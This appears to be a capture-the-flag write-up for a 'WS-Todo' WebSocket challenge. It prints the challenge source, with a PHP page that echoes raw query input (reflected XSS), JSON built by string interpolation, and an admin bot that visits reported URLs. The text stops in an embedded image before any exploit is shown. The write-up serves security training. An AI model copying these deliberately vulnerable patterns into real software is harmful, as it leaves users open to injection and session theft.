<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WS-Todo</title>
    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
    <link type="text/css" href="/css/nav.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico">
</head>

<body id="preview">
    <div style="padding-bottom: 40px;">
        <nav id="load-navbar"></nav>
        <br />
        <br />
        <hr />    
    </div>

    <div id="tags">
        <h5>Tags</h5>
        <ul>
            <li>XSS</li>
            <li>SSRF</li>
            <li>puppeteer</li>
            <li>CSWSH</li>
            <li>exfiltration</li>
            <li>Mysql VARCHAR overflow</li>
        </ul>
    </div>

    <h1 class="code-line" data-line-start="0" data-line-end="1"><a id="WSTodo_0"></a>WS-Todo</h1>
    <h2 class="code-line" data-line-start="1" data-line-end="2"><a id="Description_1"></a>Description</h2>
    <p class="has-line-data" data-line-start="2" data-line-end="3">This WebSockets-based Todo application features ✨millitary-grade encryption✨ and is extremely low-latency. Ideal for busy students and working professionals alike.</p>
    <h2 class="code-line" data-line-start="4" data-line-end="5"><a id="Provided_code_4"></a>Provided code</h2>
    <h3 class="code-line" data-line-start="5" data-line-end="6"><a id="todoroutesindexjs_5"></a><code>/todo//routes/index.js</code></h3>
    <pre><code class="has-line-data" data-line-start="7" data-line-end="108" class="language-javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
    <span class="hljs-keyword">const</span> expressWs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@wll8/express-ws'</span>);
    <span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
    
    <span class="hljs-keyword">const</span> { doReportHandler } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../util/report'</span>);
    <span class="hljs-keyword">const</span> { encrypt, decrypt } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../util/crypto'</span>);
    
    <span class="hljs-keyword">let</span> db;
    <span class="hljs-keyword">let</span> sessionParser;
    
    <span class="hljs-keyword">const</span> router = express.Router();
    
    router.get(<span class="hljs-string">'/'</span>, (req, res) =&gt; {
        <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'index.pug'</span>);
    });
    
    router.get(<span class="hljs-string">'/login'</span>, (req, res) =&gt; {
        <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'login.pug'</span>);
    });
    
    router.post(<span class="hljs-string">'/login'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
        <span class="hljs-keyword">const</span> username = req.body.username;
        <span class="hljs-keyword">const</span> password = req.body.password;
    
        <span class="hljs-keyword">if</span> (!username || !password) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'Missing username or password'</span> });
        }
    
        <span class="hljs-keyword">if</span> (result = <span class="hljs-keyword">await</span> db.loginUser(username, password)) {
            req.session.userId = result.id;
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">200</span>).json({ success: <span class="hljs-string">'User logged in'</span> });
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'Invalid username or password'</span> });
        }
    });
    
    router.get(<span class="hljs-string">'/register'</span>, (req, res) =&gt; {
        <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'register.pug'</span>);
    });
    
    router.post(<span class="hljs-string">'/register'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
        <span class="hljs-keyword">const</span> username = req.body.username;
        <span class="hljs-keyword">const</span> password = req.body.password;
    
        <span class="hljs-keyword">if</span> (!username || !password) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({
                error: <span class="hljs-string">'Missing username or password'</span>
            });
        }
    
        <span class="hljs-keyword">if</span> (password.length &lt; <span class="hljs-number">8</span>) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({
                error: <span class="hljs-string">'Password must be at least 8 characters long'</span>
            });
        }
    
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> db.userExists(username)) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'User already exists'</span> });
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">16</span>).toString(<span class="hljs-string">'hex'</span>);
            <span class="hljs-keyword">await</span> db.registerUser(username, password, secret);
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">200</span>).json({ success: <span class="hljs-string">'User registered'</span> });
        }
    
        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">200</span>).json({ success: <span class="hljs-literal">true</span> });
    });
    
    router.get(<span class="hljs-string">'/secret'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> db.getSecret(req.session.userId);
        <span class="hljs-keyword">if</span> (result) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">200</span>).json({ secret: result });
        }
        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'No secret found'</span> });
    });
    
    router.post(<span class="hljs-string">'/decrypt'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
        <span class="hljs-keyword">if</span> (!req.body.secret) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'Missing secret'</span> });
        }
    
        <span class="hljs-keyword">if</span> (!req.body.cipher) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'Missing cipher'</span> });
        }
    
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">const</span> result = decrypt(req.body.cipher, req.body.secret);
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">200</span>).json({ decrypted: result });
        } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ error: <span class="hljs-string">'Invalid key or cipher'</span> });
        }
    });
    
    <span class="hljs-comment">// Report any suspicious activity to the admin!</span>
    router.post(<span class="hljs-string">'/report'</span>, doReportHandler);
    
    <span class="hljs-built_in">module</span>.exports = (database, session) =&gt; {
        db = database;
        sessionParser = session;
        <span class="hljs-keyword">return</span> router;
    };
    </code></pre>
    <h3 class="code-line" data-line-start="109" data-line-end="110"><a id="todowsHandlerjs_109"></a><code>/todo/wsHandler.js</code></h3>
    <pre><code class="has-line-data" data-line-start="111" data-line-end="186" class="language-javascript"><span class="hljs-keyword">const</span> { encrypt, decrypt } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./util/crypto'</span>);
    
    <span class="hljs-keyword">let</span> db;
    <span class="hljs-keyword">let</span> sessionParser;
    
    <span class="hljs-keyword">const</span> quotes = [
        <span class="hljs-string">"Genius is one percent inspiration and ninety-nine percent perspiration."</span>,
        <span class="hljs-string">"Fate is in your hands and no one elses."</span>,
        <span class="hljs-string">"Trust yourself. You know more than you think you do."</span>
    ];
    
    <span class="hljs-keyword">const</span> wsHandler = (ws, req) =&gt; {
        <span class="hljs-keyword">let</span> userId;
        sessionParser(req, {}, () =&gt; {
            <span class="hljs-keyword">if</span> (req.session.userId) {
                userId = req.session.userId;
            } <span class="hljs-keyword">else</span> {
                ws.close();
            }
        });
    
        ws.on(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {
            <span class="hljs-keyword">const</span> data = <span class="hljs-built_in">JSON</span>.parse(msg);
            <span class="hljs-keyword">const</span> secret = <span class="hljs-keyword">await</span> db.getSecret(req.session.userId);
    
            <span class="hljs-keyword">if</span> (data.action === <span class="hljs-string">'add'</span>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">await</span> db.addTask(userId, <span class="hljs-string">`{"title":"<span class="hljs-subst">${data.title}</span>","description":"<span class="hljs-subst">${data.description}</span>","secret":"<span class="hljs-subst">${secret}</span>"}`</span>);
                    ws.send(<span class="hljs-built_in">JSON</span>.stringify({ success: <span class="hljs-literal">true</span>, action: <span class="hljs-string">'add'</span> }));
                } <span class="hljs-keyword">catch</span> (e) {
                    ws.send(<span class="hljs-built_in">JSON</span>.stringify({ success: <span class="hljs-literal">false</span>, action: <span class="hljs-string">'add'</span> }));
                }
            }
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.action === <span class="hljs-string">'get'</span>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> db.getTasks(userId);
                    <span class="hljs-keyword">const</span> tasks = [];
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> result <span class="hljs-keyword">of</span> results) {
    
                        <span class="hljs-keyword">let</span> quote;
    
                        <span class="hljs-keyword">if</span> (userId === <span class="hljs-number">1</span>) {
                            quote = <span class="hljs-string">`A wise man once said, "the flag is <span class="hljs-subst">${process.env.FLAG}</span>".`</span>;
                        } <span class="hljs-keyword">else</span> {
                            quote = quotes[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * quotes.length)];
                        }
    
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-keyword">const</span> task = <span class="hljs-built_in">JSON</span>.parse(result.data);
                            tasks.push({
                                title: encrypt(task.title, task.secret),
                                description: encrypt(task.description, task.secret),
                                quote: encrypt(quote, task.secret)
                            });
                        } <span class="hljs-keyword">catch</span> (e) {
                            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Error parsing task <span class="hljs-subst">${result.data}</span>: <span class="hljs-subst">${e}</span>`</span>);
                        }
                    }
                    ws.send(<span class="hljs-built_in">JSON</span>.stringify({ success: <span class="hljs-literal">true</span>, action: <span class="hljs-string">'get'</span>, tasks: tasks }));
                } <span class="hljs-keyword">catch</span> (e) {
                    ws.send(<span class="hljs-built_in">JSON</span>.stringify({ success: <span class="hljs-literal">false</span>, action: <span class="hljs-string">'get'</span> }));
                }
            }
            <span class="hljs-keyword">else</span> {
                ws.send(<span class="hljs-built_in">JSON</span>.stringify({ success: <span class="hljs-literal">false</span>, error: <span class="hljs-string">'Invalid action'</span> }));
            }
        });
    };
    
    <span class="hljs-built_in">module</span>.exports = (database, session) =&gt; {
        db = database;
        sessionParser = session;
        <span class="hljs-keyword">return</span> wsHandler;
    };
    </code></pre>
    <h3 class="code-line" data-line-start="187" data-line-end="188"><a id="todoutilreportjs_187"></a><code>/todo/util/report.js</code></h3>
    <pre><code class="has-line-data" data-line-start="189" data-line-end="262" class="language-javascript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer'</span>)
    
    <span class="hljs-comment">// please note that 127.0.0.1 and localhost are considered different hosts</span>
    <span class="hljs-comment">// due to ingress networking rules a container can't reach itself through the it's external IP, so you'd have to use the internal ports (80, 8080) and 127.0.0.1</span>
    
    <span class="hljs-keyword">const</span> LOGIN_URL = <span class="hljs-string">"http://127.0.0.1/login"</span>;
    
    <span class="hljs-keyword">let</span> browser = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">const</span> visit = <span class="hljs-keyword">async</span> (url) =&gt; {
        <span class="hljs-keyword">const</span> ctx = <span class="hljs-keyword">await</span> browser.createIncognitoBrowserContext()
        <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> ctx.newPage()
    
        <span class="hljs-keyword">await</span> page.goto(LOGIN_URL, { waitUntil: <span class="hljs-string">'networkidle2'</span> })
        <span class="hljs-keyword">await</span> page.waitForSelector(<span class="hljs-string">'form'</span>)
        <span class="hljs-keyword">await</span> page.type(<span class="hljs-string">'wired-input[name=username]'</span>, process.env.USERNAME)
        <span class="hljs-keyword">await</span> page.type(<span class="hljs-string">'wired-input[name=password]'</span>, process.env.PASSWORD)
        <span class="hljs-keyword">await</span> page.click(<span class="hljs-string">'wired-button'</span>)
    
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">await</span> page.goto(url, { waitUntil: <span class="hljs-string">'networkidle2'</span> })
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">await</span> page.close()
            <span class="hljs-keyword">await</span> ctx.close()
        }
    }
    
    <span class="hljs-keyword">const</span> doReportHandler = <span class="hljs-keyword">async</span> (req, res) =&gt; {
    
        <span class="hljs-keyword">if</span> (!browser) {
            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'[INFO] Starting browser'</span>)
            browser = <span class="hljs-keyword">await</span> puppeteer.launch({
                args: [
                    <span class="hljs-string">"--no-sandbox"</span>,
                    <span class="hljs-string">"--disable-background-networking"</span>,
                    <span class="hljs-string">"--disk-cache-dir=/dev/null"</span>,
                    <span class="hljs-string">"--disable-default-apps"</span>,
                    <span class="hljs-string">"--disable-extensions"</span>,
                    <span class="hljs-string">"--disable-desktop-notifications"</span>,
                    <span class="hljs-string">"--disable-gpu"</span>,
                    <span class="hljs-string">"--disable-sync"</span>,
                    <span class="hljs-string">"--disable-translate"</span>,
                    <span class="hljs-string">"--disable-dev-shm-usage"</span>,
                    <span class="hljs-string">"--hide-scrollbars"</span>,
                    <span class="hljs-string">"--metrics-recording-only"</span>,
                    <span class="hljs-string">"--mute-audio"</span>,
                    <span class="hljs-string">"--no-first-run"</span>,
                    <span class="hljs-string">"--safebrowsing-disable-auto-update"</span>,
                ]
            })
        }
    
        <span class="hljs-keyword">const</span> url = req.body.url
        <span class="hljs-keyword">if</span> (
            url === <span class="hljs-literal">undefined</span> ||
            (!url.startsWith(<span class="hljs-string">'http://'</span>) &amp;&amp; !url.startsWith(<span class="hljs-string">'https://'</span>))
        ) {
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).send({ error: <span class="hljs-string">'Invalid URL'</span> })
        }
    
        <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`[*] Visiting <span class="hljs-subst">${url}</span>`</span>)
            <span class="hljs-keyword">await</span> visit(url)
            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`[*] Done visiting <span class="hljs-subst">${url}</span>`</span>)
            <span class="hljs-keyword">return</span> res.sendStatus(<span class="hljs-number">200</span>)
        } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-built_in">console</span>.error(<span class="hljs-string">`[-] Error visiting <span class="hljs-subst">${url}</span>: <span class="hljs-subst">${e.message}</span>`</span>)
            <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).send({ error: e.message })
        }
    }
    
    <span class="hljs-built_in">module</span>.exports = { doReportHandler }
    </code></pre>
    <h3 class="code-line" data-line-start="263" data-line-end="264"><a id="htmltesterindexphp_263"></a><code>/htmltester/index.php</code></h3>
    <pre><code class="has-line-data" data-line-start="265" data-line-end="280" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span>
            <span class="php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'html'</span>])): <span class="hljs-preprocessor">?&gt;</span></span>
                <span class="php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'html'</span>]; <span class="hljs-preprocessor">?&gt;</span></span>
            <span class="php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-preprocessor">?&gt;</span></span>
                <span class="hljs-tag">&lt;<span class="hljs-title">h1</span>&gt;</span>HTML Tester<span class="hljs-tag">&lt;/<span class="hljs-title">h1</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span>Internal development tool<span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"index.php"</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"get"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"text"</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">"html"</span> /&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"submit"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"Submit"</span> /&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
            <span class="php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-preprocessor">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span>
    </code></pre>
    <h2 class="code-line" data-line-start="281" data-line-end="282"><a id="Methodology_281"></a>Methodology</h2>
    <p class="has-line-data" data-line-start="282" data-line-end="283">The app is divided into two parts. First app is an <code>expressjs</code> app to create notes and the second app is a <code>php</code> app which just reflects user input, perfect for <code>XSS</code>.</p>
    <p class="has-line-data" data-line-start="284" data-line-end="285"><img src="data:image/png;base64,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